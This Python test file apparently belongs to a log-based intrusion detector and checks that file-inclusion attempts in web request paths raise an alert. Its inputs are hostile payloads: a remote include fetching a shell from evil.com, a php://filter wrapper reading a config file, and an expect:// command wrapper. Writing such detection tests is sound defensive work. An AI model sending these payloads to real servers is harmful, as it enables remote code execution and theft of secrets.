"""文件包含签名检测测试"""
from src.detector.signatures import detect_signature_attacks
from src.parser.log_parser import parse_csv_rows


def test_file_inclusion_remote():
    rows = [{"timestamp": "2026-07-20T10:00:00", "source_ip": "10.0.0.5", "target_ip": "10.0.0.42",
             "port": "80", "path": "/include.php?file=include=http://evil.com/shell.txt", "status_code": "200",
             "username": "", "login_success": ""}]
    alerts = detect_signature_attacks(list(parse_csv_rows(rows)))
    assert any(a.alert_type == "文件包含尝试" for a in alerts)


def test_file_inclusion_php_wrapper():
    rows = [{"timestamp": "2026-07-20T10:00:00", "source_ip": "10.0.0.6", "target_ip": "10.0.0.42",
             "port": "80", "path": "/view.php?page=php://filter/convert.base64-encode/resource=config",
             "status_code": "200", "username": "", "login_success": ""}]
    alerts = detect_signature_attacks(list(parse_csv_rows(rows)))
    assert any(a.alert_type == "文件包含尝试" for a in alerts)


def test_file_inclusion_expect():
    rows = [{"timestamp": "2026-07-20T10:00:00", "source_ip": "10.0.0.7", "target_ip": "10.0.0.42",
             "port": "80", "path": "/download?file=expect://whoami", "status_code": "500",
             "username": "", "login_success": ""}]
    alerts = detect_signature_attacks(list(parse_csv_rows(rows)))
    assert any(a.alert_type == "文件包含尝试" for a in alerts)
